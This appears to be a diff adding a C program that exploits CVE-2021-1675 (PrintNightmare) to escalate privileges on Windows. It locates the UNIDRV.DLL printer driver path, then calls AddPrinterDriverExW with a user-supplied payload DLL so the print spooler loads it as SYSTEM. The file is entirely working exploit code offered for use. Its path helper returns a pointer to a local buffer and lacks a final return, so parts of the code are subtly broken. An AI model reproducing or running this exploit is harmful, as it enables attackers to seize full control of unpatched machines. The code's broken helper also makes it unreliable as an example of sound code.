@@ -1,0 +1,100 @@
+#include <windows.h>
+#include <stdio.h>
+
+int fileExists(wchar_t* file) {
+    WIN32_FIND_DATA FindFileData;
+    HANDLE handle = FindFirstFileW(file, &FindFileData);
+    int found = handle != INVALID_HANDLE_VALUE;
+    if (found) {
+        FindClose(handle);
+    }
+    return found;
+}
+
+wchar_t* findDLLPath() {
+
+    wchar_t targetDLLPath[MAX_PATH] = { 0 };
+
+    DWORD dwNeeded;
+    LPBYTE lpDriverInfo;
+    DWORD dwReturned;
+    DRIVER_INFO_2* pInfo;
+    DWORD i;
+
+    EnumPrinterDriversW(NULL, NULL, 2, NULL, 0, &dwNeeded, &dwReturned);
+
+    lpDriverInfo = (LPBYTE)LocalAlloc(LPTR, dwNeeded);
+    if (lpDriverInfo == NULL) {
+        return 0;
+    }
+
+    EnumPrinterDrivers(NULL, NULL, 2, lpDriverInfo, dwNeeded, &dwNeeded, &dwReturned);
+
+    pInfo = (DRIVER_INFO_2*)lpDriverInfo;
+
+    for (i = 0; i < dwReturned; i++) {
+
+        if (wcsstr(pInfo->pDriverPath, L"ntprint.inf_amd64")) {
+
+            wchar_t tempDrive1[_MAX_DRIVE] = { 0 };
+            wchar_t tempDirectory1[_MAX_DIR] = { 0 };
+            wchar_t tempFileName1[_MAX_FNAME] = { 0 };
+            wchar_t tempFileExtension1[_MAX_EXT] = { 0 };
+
+            _wsplitpath_s(pInfo->pDriverPath, &tempDrive1[0], _MAX_DRIVE, &tempDirectory1[0], _MAX_DIR, &tempFileName1[0], _MAX_FNAME, &tempFileExtension1[0], _MAX_EXT);
+
+            wchar_t* targetDLLName = (LPWSTR)L"UNIDRV.DLL";
+
+            wcscat_s(targetDLLPath, MAX_PATH, tempDrive1);
+            wcscat_s(targetDLLPath, MAX_PATH, tempDirectory1);
+            wcscat_s(targetDLLPath, MAX_PATH, targetDLLName);
+
+            if (fileExists(targetDLLPath)) {
+
+                LocalFree(lpDriverInfo);
+
+                return targetDLLPath;
+
+            }
+
+        }
+
+        pInfo++;
+    }
+
+    LocalFree(lpDriverInfo);
+
+}
+
+int wmain(int argc, wchar_t* argv[]) {
+
+    printf("\n[*] CVE-2021-1675 LPE Exploit\n\n");
+    printf("[*] Authors: Zhiniang Peng (@edwardzpeng) & Xuefeng Li (@lxf02942370)\n\n");
+    printf("[*] Modified by: Halil Dalabasmaz (@hlldz)\n\n");
+
+    if (argc != 2) {
+        printf("[*] Usage: CVE-2021-1675-LPE.exe PAYLOAD_DLL_PATH\n");
+        return 0;
+    }
+
+    WCHAR payloadPath[MAX_PATH] = { 0 };
+    WCHAR targetDLLPath[MAX_PATH] = { 0 };
+
+    wsprintf(payloadPath, L"%s", argv[1]);
+    wsprintf(targetDLLPath, L"%ls", findDLLPath());
+
+
+    DRIVER_INFO_2 driverInfo;
+    driverInfo.cVersion = 3;
+    driverInfo.pConfigFile = payloadPath;
+    driverInfo.pDataFile = (LPWSTR)L"C:\\Windows\\System32\\kernelbase.dll";
+    driverInfo.pDriverPath = targetDLLPath;
+    driverInfo.pEnvironment = NULL;
+    driverInfo.pName = (LPWSTR)L"1234";
+
+    DWORD addPrinter = AddPrinterDriverExW(NULL, 2, (PBYTE)&driverInfo, APD_COPY_ALL_FILES | 0x10 | 0x8000);
+
+    printf("[*] All done. GetLastError: %d\n", GetLastError());
+
+	return 0;
+}
